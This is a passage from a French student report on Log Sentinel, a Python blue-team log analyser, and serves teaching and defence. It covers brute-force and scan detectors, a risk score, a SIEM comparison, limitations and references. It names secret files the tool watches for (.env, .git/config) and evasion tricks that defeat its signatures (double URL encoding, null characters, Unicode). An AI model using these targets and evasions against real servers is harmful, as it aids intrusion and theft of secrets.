Pour chaque adresse IP, le système agrège le nombre de réponses 401/403 reçues. Si ce compteur dépasse le seuil `BF_THRESHOLD`, l'IP est signalée. L'agrégation peut être globale (sur l'ensemble du fichier) ou localement sur le même endpoint.

```python
def detect_brute_force(entries, threshold=10):
    counts = Counter(
        e["ip"] for e in entries
        if str(e.get("status")) in ("401", "403")
    )
    return [Alert("brute_force", ip, ...) for ip, count in counts.items()
            if count >= threshold]
```

**Détecteur de scan.**
La détection de scan combine deux métriques pour chaque IP : le nombre d'URIs distinctes visitées et le taux de réponses 404. Les deux conditions doivent être remplies simultanément pour éviter les faux positifs liés à des utilisateurs légitimement actifs sur un site avec beaucoup de ressources manquantes.

```python
def detect_scan(entries, threshold=20):
    # Groupement par IP
    # Condition 1 : nb URIs distinctes > threshold
    # Condition 2 : taux 404 > 50%
```

### 7.3 Score de risque global

Log Sentinel calcule un **score de risque global** pour chaque analyse, sur une échelle de 0 à 100. Ce score agrège trois composantes :

| Composante | Contribution maximale | Calcul |
|---|---|---|
| Volume d'alertes | 50 points | `min(50, nb_alertes × 2)` |
| Taux d'erreur HTTP | 30 points | `min(30, taux_erreur × 0.6)` |
| Types d'attaques graves | 20 points | +20 si présence de `brute_force`, `scan`, `sql_injection` ou `command_injection` |

**Niveaux de risque :**

| Score | Niveau | Couleur |
|---|---|---|
| 0–25 | Faible | Vert |
| 26–50 | Modéré | Jaune |
| 51–75 | Élevé | Orange |
| 76–100 | Critique | Rouge |

---

📸 **CAPTURE D'ÉCRAN** — *Score de risque CRITIQUE affiché dans le terminal ou l'interface Streamlit — score supérieur à 75, fond rouge, récapitulatif des types d'attaques contribuant au score*
> *(Insérer ici la capture)*

---

## 8. Valeur ajoutée Blue Team

### 8.1 Comparaison avec des outils professionnels

| Critère | Splunk Enterprise | ELK Stack | Graylog | Log Sentinel |
|---|---|---|---|---|
| **Coût** | Très élevé (licence) | Gratuit (infra requise) | Gratuit/payant | Gratuit (open source) |
| **Déploiement** | Complexe | Complexe (3 composants) | Modéré | Simple (pip install) |
| **Formats supportés** | Très large | Large (via Logstash) | Large | Apache, Nginx, Syslog |
| **Corrélation temps réel** | Oui | Oui | Oui | Non (analyse de fichiers) |
| **Machine Learning** | Oui (MLTK) | Oui (via Elastic ML) | Partiel | Non |
| **Interface** | Web avancée | Kibana | Web | Streamlit + CLI |
| **Courbe d'apprentissage** | Élevée | Élevée | Modérée | Faible |
| **Adapté à un seul fichier** | Overkill | Overkill | Overkill | Idéal |

**Analyse.** Les solutions SIEM professionnelles comme Splunk ou la stack ELK sont conçues pour ingérer des flux de logs en temps réel depuis des dizaines ou centaines de sources simultanément, avec des capacités de corrélation avancées. Leur déploiement requiert une infrastructure dédiée et des compétences spécialisées. Log Sentinel adopte une philosophie radicalement différente : outil léger, autonome, sans infrastructure, opérationnel en quelques secondes.

### 8.2 Ce que Log Sentinel apporte à petite échelle

Log Sentinel offre une valeur ajoutée distincte dans plusieurs scenarios :

**Accessibilité pédagogique.** Pour un étudiant en cybersécurité, Log Sentinel constitue un outil d'apprentissage idéal. Il permet de comprendre concrètement comment les attaques se manifestent dans les logs, en rendant visible ce que des outils complexes abstraient derrière des interfaces graphiques sophistiquées.

**Analyse ad hoc.** Un administrateur système qui récupère les logs d'un serveur compromis après un incident peut lancer Log Sentinel sur le fichier en quelques secondes et obtenir immédiatement un rapport structuré, sans configurer une infrastructure SIEM.

**Autonomie complète.** Log Sentinel ne nécessite aucune connexion à un service externe (à l'exception de l'enrichissement OSINT optionnel via ip-api.com), ce qui le rend utilisable dans des environnements isolés ou air-gappés.

### 8.3 Cas d'usage réels

**Cas 1 — Audit post-incident.** Un hébergeur web détecte une dégradation de son site WordPress. En lançant Log Sentinel sur les logs Apache du jour concerné, il identifie en quelques secondes une campagne de brute-force sur `/wp-login.php` provenant d'un bloc d'adresses IP géolocalisées dans un pays particulier, permettant une action de blocage immédiate.

**Cas 2 — Vérification de conformité.** Un responsable sécurité doit démontrer que les accès aux fichiers de configuration sensibles sont surveillés. Log Sentinel génère un rapport HTML documentant les tentatives d'accès à `.env` et `.git/config`, utilisable comme preuve dans un audit ISO 27001.

**Cas 3 — Formation SOC.** Un formateur en cybersécurité utilise Log Sentinel avec des fichiers de logs synthétiques contenant des attaques artificiellement insérées. Les stagiaires analysent les résultats et apprennent à interpréter les différents types d'alertes.

---

📸 **CAPTURE D'ÉCRAN** — *Résultats OSINT et géolocalisation des IPs suspectes dans Log Sentinel : tableau affichant pays, ville, FAI et organisation pour chaque IP ayant déclenché des alertes*
> *(Insérer ici la capture)*

---

## 9. Limites et perspectives

### 9.1 Limites actuelles

**Absence de corrélation temporelle.** Log Sentinel traite actuellement le fichier de logs dans sa globalité, sans distinguer les événements par fenêtre temporelle. Cette limitation a une conséquence pratique importante : une attaque de brute-force étalée sur 30 minutes avec 5 tentatives toutes les 3 minutes ne sera pas détectée avec le même seuil qu'une attaque concentrée sur 10 secondes. Une détection basée sur des fenêtres glissantes (*sliding windows*) serait nettement plus précise.

**Détection basée uniquement sur les signatures.** L'approche regex, bien qu'efficace pour les attaques connues, est contournable par un attaquant qui obfusque ses payloads via des encodages ou fragmentations inhabituels. Les techniques d'évasion avancées (double encodage URL, insertion de caractères nuls, encodage Unicode) peuvent déjouer les patterns actuels.

**Formats supportés limités.** Log Sentinel supporte actuellement Apache Combined Log Format, Nginx et Syslog. De nombreux formats importants — journaux IIS (Windows), logs de pare-feu (Cisco ASA, pfSense), logs d'applications métier, format JSON personnalisé — ne sont pas pris en charge.

**Score de risque heuristique.** La formule de calcul du score de risque, bien qu'intuitive, repose sur des coefficients arbitraires non issus d'une modélisation statistique rigoureuse. Elle peut sur- ou sous-évaluer le risque réel selon les caractéristiques du fichier analysé.

**Analyse statique.** Log Sentinel analyse des fichiers de logs archivés. Il ne propose pas de surveillance en temps réel (*live tailing*), ce qui le distingue fondamentalement des SIEM et le limite aux analyses post-hoc.

**Enrichissement OSINT limité.** L'intégration OSINT est limitée à 5 adresses IP maximum (contrainte de l'API gratuite ip-api.com) et ne couvre que la géolocalisation. Des informations complémentaires — réputation de l'IP (listes noires), historique d'abus (AbuseIPDB), informations ASN — seraient précieuses pour contextualiser les alertes.

### 9.2 Améliorations possibles

**Fenêtrage temporel.** L'implémentation d'une analyse par fenêtres temporelles glissantes permettrait une détection comportementale plus précise, notamment pour les attaques lentes et distribuées (*slow and low attacks*). Python offre des structures de données adaptées à ce traitement (deque, groupby sur timestamps parsés).

**Machine Learning.** L'intégration de modèles d'apprentissage automatique ouvrirait des perspectives de détection d'anomalies non encore connues. Des approches non supervisées — Isolation Forest, One-Class SVM, autoencoders — permettraient d'identifier des comportements statistiquement anormaux sans nécessiter de signatures prédéfinies. Des bibliothèques Python comme scikit-learn ou PyTorch rendraient cela accessible.

**Support de formats supplémentaires.** L'ajout de parsers pour les formats IIS, JSON génériques, les logs de pare-feu Cisco ASA ou les journaux d'authentification Windows Event Log élargirait significativement le périmètre d'utilisation de l'outil.

**Export multi-format.** Compléter le rapport HTML par des exports CSV et JSON permettrait l'intégration de Log Sentinel dans des pipelines d'automatisation plus larges, ou l'alimentation de SIEM via des connecteurs standardisés.

**Corrélation multi-fichiers.** La capacité à analyser simultanément plusieurs fichiers de logs (access log + error log + auth.log) et à corréler les événements entre eux améliorerait considérablement la précision de la détection.

**Amélioration de l'enrichissement OSINT.** L'intégration d'APIs supplémentaires — AbuseIPDB pour la réputation des IPs, Shodan pour les informations sur les hôtes, VirusTotal pour l'analyse des domaines référents — enrichirait le contexte des alertes.

**Mode temps réel.** L'implémentation d'un mode de surveillance en temps réel, basé sur la lecture incrémentale des fichiers de logs (*inotify* sous Linux, *ReadDirectoryChangesW* sous Windows), transformerait Log Sentinel d'un outil d'analyse statique en un outil de surveillance active.

---

## 10. Conclusion

Ce document a présenté le contexte théorique et pratique du projet Log Sentinel, un analyseur intelligent de logs développé en Python dans le cadre d'un Master 1 Cybersécurité. À travers l'étude des fondements de la Blue Team, des formats de logs supportés, de la taxonomie des attaques détectées et de la méthodologie de détection employée, il apparaît que Log Sentinel répond à une problématique réelle et documentée : l'impossibilité pratique d'analyser manuellement des volumes significatifs de logs de sécurité.

L'outil s'inscrit dans l'écosystème Blue Team en proposant une alternative légère et accessible aux solutions SIEM industrielles, sans en ambitionner le périmètre fonctionnel complet. Sa valeur réside dans sa simplicité de déploiement, son autonomie, sa couverture des vecteurs d'attaque les plus courants et la lisibilité de ses rapports.

Les limites identifiées — absence de corrélation temporelle, formats supportés restreints, score heuristique — délimitent clairement le cadre pédagogique du projet, tout en ouvrant des perspectives d'amélioration concrètes vers un outil plus mature. L'intégration future de techniques de machine learning pour la détection d'anomalies, en particulier, constituerait une évolution naturelle vers un outil de détection de menaces plus robuste.

En définitive, Log Sentinel illustre comment Python, avec ses bibliothèques standard enrichies (`re`, `collections`, `argparse`) et son écosystème de visualisation (`rich`, `streamlit`), permet de construire des outils de cybersécurité opérationnels, pédagogiques et maintenables, accessibles à un praticien en formation sans nécessiter de ressources infrastructure significatives.

---

## 11. Références

### Standards et guides institutionnels

- **NIST SP 800-92** — Kent, K. & Souppaya, M. (2006). *Guide to Computer Security Log Management*. National Institute of Standards and Technology. https://csrc.nist.gov/publications/detail/sp/800-92/final

- **NIST Cybersecurity Framework v2.0** (2024). National Institute of Standards and Technology. https://www.nist.gov/cyberframework

- **ISO/IEC 27001:2022** — *Information security, cybersecurity and privacy protection — Information security management systems — Requirements*. International Organization for Standardization.

- **RFC 3164** — Lonvick, C. (2001). *The BSD Syslog Protocol*. Internet Engineering Task Force. https://www.rfc-editor.org/rfc/rfc3164

- **RFC 5424** — Gerhards, R. (2009). *The Syslog Protocol*. Internet Engineering Task Force. https://www.rfc-editor.org/rfc/rfc5424

- **Règlement (UE) 2016/679** — *Règlement général sur la protection des données (RGPD)*. Parlement européen et Conseil de l'Union européenne. https://eur-lex.europa.eu/legal-content/FR/TXT/?uri=CELEX:32016R0679

### OWASP

- **OWASP Top 10:2021** — *The Ten Most Critical Web Application Security Risks*. Open Web Application Security Project. https://owasp.org/Top10/

- **OWASP Testing Guide v4.2** — *Web Security Testing Guide*. Open Web Application Security Project. https://owasp.org/www-project-web-security-testing-guide/

- **CWE-89** — *Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)*. MITRE Corporation. https://cwe.mitre.org/data/definitions/89.html

- **CWE-79** — *Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)*. MITRE Corporation. https://cwe.mitre.org/data/definitions/79.html

- **CWE-78** — *Improper Neutralization of Special Elements used in an OS Command (OS Command Injection)*. MITRE Corporation. https://cwe.mitre.org/data/definitions/78.html

- **CWE-22** — *Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)*. MITRE Corporation. https://cwe.mitre.org/data/definitions/22.html

### MITRE ATT&CK

- **MITRE ATT&CK® Framework** — *Adversarial Tactics, Techniques & Common Knowledge*. MITRE Corporation. https://attack.mitre.org/

- **T1110** — *Brute Force*. MITRE ATT&CK. https://attack.mitre.org/techniques/T1110/

- **T1595** — *Active Scanning*. MITRE ATT&CK. https://attack.mitre.org/techniques/T1595/

### Documentation technique

- **Apache HTTP Server — Log Files** — The Apache Software Foundation. https://httpd.apache.org/docs/current/logs.html

- **Nginx — Configuring Logging** — Nginx, Inc. https://docs.nginx.com/nginx/admin-guide/monitoring/logging/

- **Python Documentation — `re` module** — Python Software Foundation. https://docs.python.org/3/library/re.html

- **Streamlit Documentation** — Streamlit Inc. https://docs.streamlit.io/

- **Rich Documentation** — Will McGugan. https://rich.readthedocs.io/

### Ouvrages de référence

- Cichonski, P., Millar, T., Grance, T., & Scarfone, K. (2012). *Computer Security Incident Handling Guide* (NIST SP 800-61 Rev. 2). NIST.

- Scarfone, K. & Mell, P. (2007). *Guide to Intrusion Detection and Prevention Systems (IDPS)* (NIST SP 800-94). NIST.

- Stuttard, D. & Pinto, M. (2011). *The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws* (2nd ed.). Wiley.

---

*Document rédigé dans le cadre du Master 1 Cybersécurité — Module Python — Mars 2026*
*NAOMIE NGWIDJOMBY MOUSSAVOU*
